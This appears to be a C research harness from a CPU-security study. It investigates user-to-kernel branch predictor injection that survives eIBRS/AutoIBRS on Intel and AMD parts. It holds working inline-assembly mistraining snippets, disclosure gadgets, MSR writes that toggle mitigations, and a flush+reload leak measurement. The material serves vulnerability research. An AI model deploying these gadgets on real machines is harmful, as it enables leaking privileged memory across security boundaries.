// SPDX-License-Identifier: GPL-3.0-only
/*
 * Investigate source of $BPRC_{U \rightarrow K}$
 */

#include <err.h>
#include <syscall.h>
#include <unistd.h>

#include "ap_ioctl.h"
#include "bp_tools.h"
#include "memtools.h"
#include "msr.h"
#include "stats.h"

#define RB_OFFSET 0xcc0
#define RB_STRIDE (4096 + 256) // reduce false positives on Gracemont
#include "rb_tools.h"

#define NUM_ROUNDS 100000
#define MAX_ATTEMPTS 8

typedef struct registers
{
    u64 src_ptr;     // code snip that contains the jump instruction
    u64 dst_ptr_ptr; // jump target

    u64 memory_ptr;
} registers_t;

typedef struct exp_params
{
    u64 victim_src;
    u64 victim_src_cfi_label;
    u64 victim_src_size;
    u64 train_src;
    u64 train_src_cfi_label;
    u64 train_src_size;
} exp_params_t;

typedef struct run_params
{
    registers_t *train;
    registers_t *victim;
} run_params_t;

typedef struct exp_res
{
    u64 hits_btb;
    u64 hits_ibp;
    u64 check;
} exp_res_t;

// clang-format off
extern unsigned char train_src_label_jump[];
mk_snip(train_src_jump,
    BHB_SETUP(194, 0x10 - 2)
    "clflush (%rbx)\n"
    "lfence\n"
    "train_src_label_jump:\n"
    "jmp *(%rbx)\n"
    "int3\n"
);
extern unsigned char train_src_label_call[];
mk_snip(train_src_call,
    BHB_SETUP(194, 0x10 - 2)
    "clflush (%rbx)\n"
    "lfence\n"
    "train_src_label_call:\n"
    "call *(%rbx)\n"
    "ret\n"
    "int3\n"
);
extern unsigned char train_src_label_ret[];
mk_snip(train_src_ret,
    "pushq (%rbx)\n"
    BHB_SETUP(194, 0x10 - 2)
    "clflush (%rsp)\n"
    "lfence\n"
    "train_src_label_ret:\n"
    "ret\n"
    "int3\n"
);
// clang-format on

// clang-format off
extern unsigned char victim_src_label_jump[];
mk_snip(victim_src_jump,
    BHB_SETUP(194, 0x10 - 2)
    "clflush (%rbx)\n"
    "lfence\n"
    "victim_src_label_jump:\n"
    "jmp *(%rbx)\n"
    "int3\n"
);
extern unsigned char victim_src_label_call[];
mk_snip(victim_src_call,
    BHB_SETUP(194, 0x10 - 2)
    "clflush (%rbx)\n"
    "lfence\n"
    "victim_src_label_call:\n"
    "call *(%rbx)\n"
    "ret\n"
    "int3\n"
);
extern unsigned char victim_src_label_ret[];
mk_snip(victim_src_ret,
    ".rept 16\n"
    "lea 1f(%rip), %r8\n"
    "pushq  %r8       \n"
    "ret\n"
    "1:\n"
    ".endr\n"

    // put in some distance between the underflow and the victim to avoid tainting the BTB
    ".rept 32\n"
    "nop\n"
    ".endr\n"

    "pushq (%rbx)\n"
    BHB_SETUP(194, 0x10 - 2)
    // increase speculation window
    "clflush (%rsp)\n"
    "lfence\n"
    // mistrained ret
    "victim_src_label_ret:\n"
    "ret\n"
    "int3\n"
);
// clang-format on

// clang-format off
mk_snip(victim_gadget,
    // BTB disclosure gadget
    "add $"STR(RB_OFFSET + RB_STRIDE + RB_STRIDE)", %rcx\n"
    "mov (%rcx), %rcx\n"
    "ret\n"
    "int3           \n"
);
// clang-format on

// clang-format off
mk_snip(train_dst,
    // IBP disclosure gadget
    "add $"STR(RB_OFFSET)", %rcx\n"
    "mov (%rcx), %rcx\n"
    // privilege domain change to induce branch privilige injection
    "syscall\n"
    ".rept 32\n"
    "nop\n"
    ".endr\n"
    "ret\n"
    "int3\n"
);
// clang-format on

// clang-format off
mk_snip(victim_dst,
    "lfence\n"
    "ret\n"
    "int3       \n"
);
// clang-format on


void run_snip_call(void *v)
{
    struct registers *r = v;

    // clang-format off
    asm volatile(
        "call *%%rdx\n"
        :
        : "d"(r->src_ptr), "b"(r->dst_ptr_ptr), "c"(r->memory_ptr)
        : "r8", "memory", "flags");
    // clang-format on
}

// outside the function to make sure compiler does not optimize it away
struct ap_payload p;
void run_exp_once(run_params_t *params)
{
    // params
    registers_t *train = params->train;
    registers_t *victim = params->victim;

    p.fptr = run_snip_call;
    p.data = victim;

    rb_reset();
    // isolate the measurements from the setup
    for (volatile int i = 0; i < 100000; ++i)
        ;

    for (int attempt = 0; attempt < MAX_ATTEMPTS; ++attempt)
    {
        rb_flush();

        // clang-format off
        asm volatile(
            "lea 1f(%%rip), %%r11\n"
            "pushq %%r11\n"
            "jmp *%0\n" // we can use a call here but it decreases the signal
            "1:\n"
            :
            : "r"(train->src_ptr), "b"(train->dst_ptr_ptr), "c"(train->memory_ptr)
            , "a"(SYS_ioctl), "D"(fd_ap), "S"(AP_IOCTL_RUN), "d"(&p) // ioctl params to run victim
            : "r8", "r11", "memory");
        // clang-format on

        // we need this to reduce false positives on alderlake
        for (volatile int i = 0; i < 10000; ++i)
            ;
        rb_reload();
    }
}

const u64 dummy_memory;
int run_exp(exp_params_t *params, exp_res_t *exp_res)
{
    int err = 0;

    // build the set of code snippets in advance
    code_snip_t train_src_snip;
    code_snip_t train_dst_snip;
    code_snip_t victim_src_snip;
    code_snip_t victim_dst_snip;
    code_snip_t victim_gadget_snip;

    // create the victim we want to attack
    u64 victim_jmp_addr;
    u64 victim_src_addr;
    do
    {
        // location of victim jump
        victim_jmp_addr = rand47();
        // calculate start of victim snip so jmp has correct location
        victim_src_addr = victim_jmp_addr - (params->victim_src_cfi_label - params->victim_src);
    } while (map_code(&victim_src_snip, victim_src_addr, _ptr(params->victim_src), params->victim_src_size));

    // put the real victim target in a random location
    u64 victim_dst_addr;
    do
    {
        victim_dst_addr = rand47();
    } while (init_snip(&victim_dst_snip, victim_dst_addr, victim_dst));

    // create a gadget at a random but BTB predictable location
    u64 victim_gadget_addr;
    do
    {
        victim_gadget_addr = ((victim_jmp_addr & 0x7FFFFF000000ul) | (rand47() & 0xFFFFFFul));
    } while (init_snip(&victim_gadget_snip, victim_gadget_addr, victim_gadget));

    // create training addrs
    u64 train_jmp_addr = (victim_jmp_addr & 0x40FFFFFFFFFFul) ^ 0x600000000000ul;
    u64 train_src_addr = train_jmp_addr - (params->train_src_cfi_label - params->train_src);
    if (map_code(&train_src_snip, train_src_addr, _ptr(params->train_src), params->train_src_size))
    {
        err = 1;
        goto cleanup_victim_gadget;
    }

    // create a training destination such that the upper bits match training source and the lower the victim gadget
    u64 train_dst_addr = (train_src_addr & 0x7FFFFF000000ul) | (victim_gadget_addr & 0xFFFFFFul);
    if (init_snip(&train_dst_snip, train_dst_addr, train_dst))
    {
        err = 1;
        goto cleanup_train_src;
    }

    int secret = rand() % (RB_SLOTS - 2);

    registers_t train;
    registers_t victim;

    victim.src_ptr = victim_src_addr;
    victim.dst_ptr_ptr = _ul(&victim_dst_snip.ptr_u64); // set the target to wherever
    victim.memory_ptr = RB_PTR + secret * RB_STRIDE;

    u64 train_dst_ptr = train_dst_snip.ptr_u64;
    train.src_ptr = train_src_addr;
    train.dst_ptr_ptr = _ul(&train_dst_ptr);
    train.memory_ptr = _ul(&dummy_memory) - RB_OFFSET;

    run_params_t run_params = {
        .train = &train,
        .victim = &victim,
    };

    run_exp_once(&run_params);

    exp_res->hits_ibp = rb_hist[secret];
    exp_res->hits_btb = rb_hist[secret + 2];
    exp_res->check = rb_hist[secret + 3];

    junmap(&train_dst_snip);
cleanup_train_src:
    junmap(&train_src_snip);
cleanup_victim_gadget:
    junmap(&victim_gadget_snip);
    junmap(&victim_dst_snip);
    junmap(&victim_src_snip);

    return err;
}

u64 results_btb[NUM_ROUNDS] = {0};
u64 results_ibp[NUM_ROUNDS] = {0};
u64 results_check[NUM_ROUNDS] = {0};
void evaluate_experiment(exp_params_t *params, char *label_prefix)
{
    INFO("running %s\n", label_prefix);
    for (int r = 0; r < NUM_ROUNDS; ++r)
    {
        exp_res_t exp_res;

        if (run_exp(params, &exp_res))
        {
            // retry if there was an issue (i.e. addr generation)
            --r;
            continue;
        }

        results_btb[r] = exp_res.hits_btb;
        results_ibp[r] = exp_res.hits_ibp;
        results_check[r] = exp_res.check;
    }

    stats_results_start();
    printf("%s", label_prefix);
    stats_print_u64("hits_per_round_btb_median", stats_median_u64(results_btb, NUM_ROUNDS));
    printf("%s", label_prefix);
    stats_print_f64("hits_per_round_btb_avg", stats_avg_u64(results_btb, NUM_ROUNDS));
    printf("%s", label_prefix);
    stats_print_f64("hits_per_round_btb_count_gt0", stats_count_u64(results_btb, NUM_ROUNDS, &stats_pred_gt0));
    printf("%s", label_prefix);
    stats_print_u64("hits_per_round_ibp_median", stats_median_u64(results_ibp, NUM_ROUNDS));
    printf("%s", label_prefix);
    stats_print_f64("hits_per_round_ibp_avg", stats_avg_u64(results_ibp, NUM_ROUNDS));
    printf("%s", label_prefix);
    stats_print_f64("hits_per_round_ibp_count_gt0", stats_count_u64(results_ibp, NUM_ROUNDS, &stats_pred_gt0));
    printf("%s", label_prefix);
    stats_print_u64("hits_per_round_check_median", stats_median_u64(results_check, NUM_ROUNDS));
    printf("%s", label_prefix);
    stats_print_f64("hits_per_round_check_avg", stats_avg_u64(results_check, NUM_ROUNDS));
    printf("%s", label_prefix);
    stats_print_f64("hits_per_round_check_count_gt0", stats_count_u64(results_check, NUM_ROUNDS, &stats_pred_gt0));
    stats_results_end();
    fflush(stdout);
}

int main(int argc, char *argv[])
{
    srandom(getpid());

    msr_init();
    rb_init();
    ap_init();

    // make sure the eIBRS or AutoIBRS is enabled
#if defined(MARCH_ZEN4)
    // enable AutoIBRS
    msr_params_t msr_params = {
        .msr_nr = MSR_EFER,
        .msr_value = 0,
    };
    ap_run((void (*)(void *))msr_rdmsr, &msr_params);
    msr_params.msr_value |= AIBRSE_MASK;
    ap_run((void (*)(void *))msr_wrmsr, &msr_params);
#elif defined(MARCH_ZEN5)
    // clear AutoIBRS bit as Zen 5 has protection even without
    msr_params_t msr_params = {
        .msr_nr = MSR_EFER,
        .msr_value = 0,
    };
    ap_run((void (*)(void *))msr_rdmsr, &msr_params);
    msr_params.msr_value &= ~AIBRSE_MASK;
    ap_run((void (*)(void *))msr_wrmsr, &msr_params);
#else
    // make sure eIBRS is enabled and nothing else
    msr_params_t msr_params = {
        .msr_nr = MSR_IA32_SPEC_CTRL,
        .msr_value = IBRS_MASK,
    };
    ap_run((void (*)(void *))msr_wrmsr, &msr_params);
#endif

    INFO("finding leaks\n");

    // run the experiment for all types of instructions

    exp_params_t params_jump = {
        .victim_src = _ul(victim_src_jump__snip),
        .victim_src_cfi_label = _ul(victim_src_label_jump),
        .victim_src_size = snip_sz(victim_src_jump),
        .train_src = _ul(train_src_jump__snip),
        .train_src_cfi_label = _ul(train_src_label_jump),
        .train_src_size = snip_sz(train_src_jump),
    };
    evaluate_experiment(&params_jump, "jump_");

    exp_params_t params_call = {
        .victim_src = _ul(victim_src_call__snip),
        .victim_src_cfi_label = _ul(victim_src_label_call),
        .victim_src_size = snip_sz(victim_src_call),
        .train_src = _ul(train_src_call__snip),
        .train_src_cfi_label = _ul(train_src_label_call),
        .train_src_size = snip_sz(train_src_call),
    };
    evaluate_experiment(&params_call, "call_");

    exp_params_t params_ret = {
        .victim_src = _ul(victim_src_ret__snip),
        .victim_src_cfi_label = _ul(victim_src_label_ret),
        .victim_src_size = snip_sz(victim_src_ret),
        .train_src = _ul(train_src_ret__snip),
        .train_src_cfi_label = _ul(train_src_label_ret),
        .train_src_size = snip_sz(train_src_ret),
    };
    evaluate_experiment(&params_ret, "ret_");
}
